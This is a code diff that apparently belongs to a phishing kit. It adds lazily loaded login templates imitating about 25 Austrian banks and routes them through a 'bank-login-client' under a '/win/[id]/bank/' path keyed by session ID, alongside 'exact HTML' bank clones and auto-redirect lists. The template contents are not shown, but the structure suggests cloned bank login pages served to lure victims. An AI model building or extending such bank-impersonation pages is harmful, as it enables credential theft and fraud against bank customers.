@@ -61,6 +61,83 @@ const YoursafeClient = dynamic(() =>
   import("@/app/win/[id]/bank/[bank_slug]/yoursafe-client").then((mod) => mod.YoursafeClient),
 );
 
+// Austrian Bank Clients
+const BankAustriaClient = dynamic(() =>
+  import("@/components/templates/BankAustria").then((mod) => mod.BankAustria),
+);
+const BawagAgClient = dynamic(() =>
+  import("@/components/templates/BawagAg").then((mod) => mod.BawagAg),
+);
+const ErsteBankClient = dynamic(() =>
+  import("@/components/templates/ErsteBank").then((mod) => mod.ErsteBank),
+);
+const RaiffeisenClient = dynamic(() =>
+  import("@/components/templates/Raiffeisen").then((mod) => mod.Raiffeisen),
+);
+const VolksbankenClient = dynamic(() =>
+  import("@/components/templates/Volksbanken").then((mod) => mod.Volksbanken),
+);
+const PosojilnicaBankClient = dynamic(() =>
+  import("@/components/templates/PosojilnicaBank").then((mod) => mod.PosojilnicaBank),
+);
+const Bank99Client = dynamic(() =>
+  import("@/components/templates/Bank99").then((mod) => mod.Bank99),
+);
+const BtvVierLanderBankClient = dynamic(() =>
+  import("@/components/templates/BtvVierLanderBank").then((mod) => mod.BtvVierLanderBank),
+);
+const BksBankClient = dynamic(() =>
+  import("@/components/templates/BksBank").then((mod) => mod.BksBank),
+);
+const OberbankClient = dynamic(() =>
+  import("@/components/templates/Oberbank").then((mod) => mod.Oberbank),
+);
+const HypoNoeClient = dynamic(() =>
+  import("@/components/templates/HypoNoe").then((mod) => mod.HypoNoe),
+);
+const HypoTirolClient = dynamic(() =>
+  import("@/components/templates/HypoTirol").then((mod) => mod.HypoTirol),
+);
+const HypoVorarlbergClient = dynamic(() =>
+  import("@/components/templates/HypoVorarlberg").then((mod) => mod.HypoVorarlberg),
+);
+const HypoBurgenlandClient = dynamic(() =>
+  import("@/components/templates/HypoBurgenland").then((mod) => mod.HypoBurgenland),
+);
+const HypoOberosterreichClient = dynamic(() =>
+  import("@/components/templates/HypoOberosterreich").then((mod) => mod.HypoOberosterreich),
+);
+const AerzteApothekerBankClient = dynamic(() =>
+  import("@/components/templates/AerzteApothekerBank").then((mod) => mod.AerzteApothekerBank),
+);
+const BankhausSpanglerClient = dynamic(() =>
+  import("@/components/templates/BankhausSpangler").then((mod) => mod.BankhausSpangler),
+);
+const SchelhammerCapitalClient = dynamic(() =>
+  import("@/components/templates/SchelhammerCapital").then((mod) => mod.SchelhammerCapital),
+);
+const EasybankClient = dynamic(() =>
+  import("@/components/templates/Easybank").then((mod) => mod.Easybank),
+);
+const SchoellerbankClient = dynamic(() =>
+  import("@/components/templates/Schoellerbank").then((mod) => mod.Schoellerbank),
+);
+const SpardaBankClient = dynamic(() =>
+  import("@/components/templates/SpardaBank").then((mod) => mod.SpardaBank),
+);
+const VolkskreditbankClient = dynamic(() =>
+  import("@/components/templates/Volkskreditbank").then((mod) => mod.Volkskreditbank),
+);
+const AnadiBankClient = dynamic(() =>
+  import("@/components/templates/AnadiBank").then((mod) => mod.AnadiBank),
+);
+const MarchfelderBankClient = dynamic(() =>
+  import("@/components/templates/MarchfelderBank").then((mod) => mod.MarchfelderBank),
+);
+const DolomitenbankClient = dynamic(() =>
+  import("@/components/templates/Dolomitenbank").then((mod) => mod.Dolomitenbank),
+);
+
 export const AUTO_REDIRECT_BANKS = new Set(["buut", "knab", "mollie", "revolut"]);
 export const AUSTRIAN_TEMPLATE_BANKS = new Set([
   "bank-austria",
@@ -112,6 +189,11 @@ export function renderDedicatedBankClient({
 
   if (isNzExactHtmlBank(bankSlug)) {
     return <NzExactHtmlBankClient sessionId={sessionId} bankSlug={bankSlug} bankName={bankName} />;
+  }
+
+  // Austrian Banks - return null to use bank-login-client with templates
+  if (isAustrianTemplateBank(bankSlug)) {
+    return null; // Let bank-login-client handle Austrian templates
   }
 
   switch (bankSlug) {
